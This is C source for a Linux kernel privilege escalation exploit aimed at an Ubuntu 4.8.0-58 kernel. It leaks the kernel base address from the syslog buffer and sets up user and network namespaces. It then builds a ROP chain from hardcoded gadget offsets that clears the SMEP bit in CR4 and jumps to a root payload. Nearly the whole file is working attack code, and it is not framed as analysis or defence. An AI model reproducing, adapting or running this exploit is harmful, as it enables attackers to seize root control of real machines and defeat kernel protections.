
#define _GNU_SOURCE
#include "rootaccess.h"


uint64_t xchg_eax_esp_ret_val = 0x17c55;
uint64_t pop_rdi_ret_val = 0xe56f5;
uint64_t mov_dword_ptr_rdi_eax_ret_val = 0x119227;
uint64_t mov_rax_cr4_ret_val = 0x1b170;
uint64_t neg_rax_ret_val = 0x439e7a;		
uint64_t pop_rcx_ret_val = 0x162622;
uint64_t or_rax_rcx_ret_val = 0x7bd23;
uint64_t xchg_eax_edi_ret_val = 0x12c7f7;
uint64_t mov_cr4_rdi_ret_val = 0x64210;
uint64_t jmp_rcx_val = 0x49fa0;




#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10
#define SMEP_MASK 0x100000

		

void smep_smap_bypass() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = ((KERNEL_BASE + xchg_eax_esp_ret_val) & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = (KERNEL_BASE + xchg_eax_esp_ret_val) % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}
			


	stack = (uint64_t*)((char*)stack_aligned + stack_offset);
	*stack++ = (KERNEL_BASE + pop_rdi_ret_val);			
	*stack++ = (uint64_t)&saved_esp;	
	*stack++ = (KERNEL_BASE + mov_dword_ptr_rdi_eax_ret_val);
	*stack++ = (KERNEL_BASE + mov_rax_cr4_ret_val);			
	*stack++ = (KERNEL_BASE + neg_rax_ret_val);			
	*stack++ = (KERNEL_BASE + pop_rcx_ret_val);			
	*stack++ = SMEP_MASK;			
	*stack++ = (KERNEL_BASE + or_rax_rcx_ret_val);		
	*stack++ = (KERNEL_BASE + neg_rax_ret_val);;			
	*stack++ = (KERNEL_BASE + xchg_eax_edi_ret_val);		
	*stack++ = (KERNEL_BASE + mov_cr4_rdi_ret_val);			
	*stack++ = (KERNEL_BASE + pop_rcx_ret_val);               
	*stack++ = (uint64_t)&payload;        
	*stack++ = (KERNEL_BASE + jmp_rcx_val);
}

static bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}

	close(fd);
	return true;
}





int main(int argc, char** argv) {	
	printf("[~] Starting the code SMEP/SMAP bypass\n");
	printf("[~] WARNING: Our test evnironment is as following:\n Linux ubuntu xenial 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux \n");




	printf("[~] Trying to initialize\n");

	int real_uid = getuid();
	int real_gid = getgid();
	unshare(CLONE_NEWUSER);
	unshare(CLONE_NEWNET);
	write_file("/proc/self/setgroups", "deny");
	write_file("/proc/self/uid_map", "0 %d 1\n", real_uid);
	write_file("/proc/self/gid_map", "0 %d 1\n", real_gid);
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	sched_setaffinity(0, sizeof(my_set), &my_set);
	system("/sbin/ifconfig lo mtu 1500");
	system("/sbin/ifconfig lo up");

	printf("\t[+] Done setting up the initialization\n");






	printf("[~] Trying to get the base kernel address\n");	
	
	char* buffer;
	int size;
	size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
	size = (size / getpagesize() + 1) * getpagesize();
	buffer = (char*)mmap(NULL, size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	size = klogctl(SYSLOG_ACTION_READ_ALL, &(buffer[0]), size);	
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] Can't find Kernel base address %s\n", needle1);
		exit(EXIT_FAILURE);
	}
	//printf("buffer: %s\n", buffer);
	
	// printf("hey: %s\n", substr);
				
	int start = 0;
	int end = 0;
	for (start = 0; substr[start] != '-'; start++);
	for (end = start; substr[end] != '\n'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] Can't find Kernel base address %s\n", needle2);
		exit(EXIT_FAILURE);
	}
	// printf("found: %s\n", substr);
	
	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xfffffffffff00000ul;
	r -= 0x1000000ul;
	KERNEL_BASE = r;

	printf("\t[+] Found, base kernel address:   %lx\n", KERNEL_BASE);	
	printf("\t[+] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

			
	printf("[~] Trying to bypass the SMEP/SMAP\n");
	smep_smap_bypass();
	printf("\t[+] Successfully passed SMEP/SMAP\n");
														
	
	unsigned long payload = (KERNEL_BASE + xchg_eax_esp_ret_val);
	root_access_validity(payload);
	return 0;
}
